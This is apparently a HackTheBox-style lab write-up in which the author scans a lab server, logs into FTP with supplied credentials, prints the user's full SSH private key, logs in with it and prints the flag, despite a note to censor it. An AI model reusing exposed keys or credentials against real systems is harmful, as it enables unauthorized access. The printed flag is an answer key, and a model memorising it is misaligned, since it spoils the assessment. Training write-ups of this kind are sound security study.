Task:

We were commissioned by the company `Inlanefreight Ltd` to test three different servers in their internal network. The company uses many different services, and the IT security department felt that a penetration test was necessary to gain insight into their overall security posture.

The first server is an internal DNS server that needs to be investigated. In particular, our client wants to know what information we can get out of these services and how this information could be used against its infrastructure. Our goal is to gather as much information as possible about the server and find ways to use that information against the company. However, our client has made it clear that it is forbidden to attack the services aggressively using exploits, as these services are in production.

Additionally, our teammates have found the following credentials "ceil:qwer1234", and they pointed out that some of the company's employees were talking about SSH keys on a forum.

The administrators have stored a `flag.txt` file on this server to track our progress and measure success. Fully enumerate the target and submit the contents of this file as proof.

> _Enumerate the server carefully and find the flag.txt file. Submit the contents of this file as the answer._

## initial creds

`ceil:qwer1234`
## Nmap scan

```
 nmap -sC -sV 10.129.42.195 --open
```

```
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-02 15:44 -0500
Nmap scan report for 10.129.42.195
Host is up (0.037s latency).
Not shown: 977 closed tcp ports (reset), 19 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
21/tcp   open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (ftp.int.inlanefreight.htb) [10.129.42.195]
|     Invalid command: try being more creative
|     Invalid command: try being more creative
|   NULL: 
|_    220 ProFTPD Server (ftp.int.inlanefreight.htb) [10.129.42.195]
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
2121/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Ceil's FTP) [10.129.42.195]
|     Invalid command: try being more creative
|     Invalid command: try being more creative
|   NULL: 
|_    220 ProFTPD Server (Ceil's FTP) [10.129.42.195]
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port21-TCP:V=7.991%I=7%D=11/2%Time=6AE8F642%P=x86_64-pc-linux-gnu%r(NUL
SF:L,40,"220\x20ProFTPD\x20Server\x20\(ftp\.int\.inlanefreight\.htb\)\x20\
SF:[10\.129\.42\.195\]\r\n")%r(GenericLines,9C,"220\x20ProFTPD\x20Server\x
SF:20\(ftp\.int\.inlanefreight\.htb\)\x20\[10\.129\.42\.195\]\r\n500\x20In
SF:valid\x20command:\x20try\x20being\x20more\x20creative\r\n500\x20Invalid
SF:\x20command:\x20try\x20being\x20more\x20creative\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2121-TCP:V=7.991%I=7%D=11/2%Time=6AE8F642%P=x86_64-pc-linux-gnu%r(N
SF:ULL,31,"220\x20ProFTPD\x20Server\x20\(Ceil's\x20FTP\)\x20\[10\.129\.42\
SF:.195\]\r\n")%r(GenericLines,8D,"220\x20ProFTPD\x20Server\x20\(Ceil's\x2
SF:0FTP\)\x20\[10\.129\.42\.195\]\r\n500\x20Invalid\x20command:\x20try\x20
SF:being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20being
SF:\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.47 seconds
                                                                       
```

## ftp enumeration

```
ftp ceil@10.129.42.195 -P 2121 
Connected to 10.129.42.195.
220 ProFTPD Server (Ceil's FTP) [10.129.42.195]
331 Password required for ceil
Password: 
230 User ceil logged in
Remote system type is UNIX.
Using binary mode to transfer files.

```

```
ftp> ls -la
229 Entering Extended Passive Mode (|||32642|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 .
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 ..
-rw-------   1 ceil     ceil          294 Nov 10  2021 .bash_history
-rw-r--r--   1 ceil     ceil          220 Nov 10  2021 .bash_logout
-rw-r--r--   1 ceil     ceil         3771 Nov 10  2021 .bashrc
drwx------   2 ceil     ceil         4096 Nov 10  2021 .cache
-rw-r--r--   1 ceil     ceil          807 Nov 10  2021 .profile
drwx------   2 ceil     ceil         4096 Nov 10  2021 .ssh
-rw-------   1 ceil     ceil          759 Nov 10  2021 .viminfo
226 Transfer complete
ftp> cd .ssh
250 CWD command successful
ftp> ls -la
229 Entering Extended Passive Mode (|||45366|)
150 Opening ASCII mode data connection for file list
drwx------   2 ceil     ceil         4096 Nov 10  2021 .
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 ..
-rw-rw-r--   1 ceil     ceil          738 Nov 10  2021 authorized_keys
-rw-------   1 ceil     ceil         3381 Nov 10  2021 id_rsa
-rw-r--r--   1 ceil     ceil          738 Nov 10  2021 id_rsa.pub
226 Transfer complete
ftp> 

```

```
ftp> more id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```

the private key is copied to a file and permissions are edited:

```
chmod 600 ceil.key
```

```
ssh ceil@10.129.42.195 -i ceil.key
The authenticity of host '10.129.42.195 (10.129.42.195)' can't be established.
ED25519 key fingerprint is: SHA256:AtNYHXCA7dVpi58LB+uuPe9xvc2lJwA6y7q82kZoBNM
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:14: [hashed name]
    ~/.ssh/known_hosts:16: [hashed name]
    ~/.ssh/known_hosts:17: [hashed name]
    ~/.ssh/known_hosts:25: [hashed name]
    ~/.ssh/known_hosts:26: [hashed name]
    ~/.ssh/known_hosts:35: [hashed name]
    ~/.ssh/known_hosts:36: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.42.195' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 02 Nov 2026 08:59:54 PM UTC

  System load:  0.15              Processes:               175
  Usage of /:   86.3% of 3.87GB   Users logged in:         0
  Memory usage: 14%               IPv4 address for ens192: 10.129.42.195
  Swap usage:   0%

  => / is using 86.3% of 3.87GB

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

116 updates can be installed immediately.
1 of these updates is a security update.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Nov 10 05:48:02 2021 from 10.10.14.20
ceil@NIXEASY:~$ ls
ceil@NIXEASY:~$ ls -la
total 36
drwxr-xr-x 4 ceil ceil 4096 Nov 10  2021 .
drwxr-xr-x 5 root root 4096 Nov 10  2021 ..
-rw------- 1 ceil ceil  294 Nov 10  2021 .bash_history
-rw-r--r-- 1 ceil ceil  220 Nov 10  2021 .bash_logout
-rw-r--r-- 1 ceil ceil 3771 Nov 10  2021 .bashrc
drwx------ 2 ceil ceil 4096 Nov 10  2021 .cache
-rw-r--r-- 1 ceil ceil  807 Nov 10  2021 .profile
drwx------ 2 ceil ceil 4096 Nov 10  2021 .ssh
-rw------- 1 ceil ceil  759 Nov 10  2021 .viminfo

```

```
ceil@NIXEASY:~$ find / -name "flag.txt" 2>/dev/null
/home/flag/flag.txt
```

```
ceil@NIXEASY:~$ cat /home/flag/flag.txt
HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj} censor the flag for htb policy
```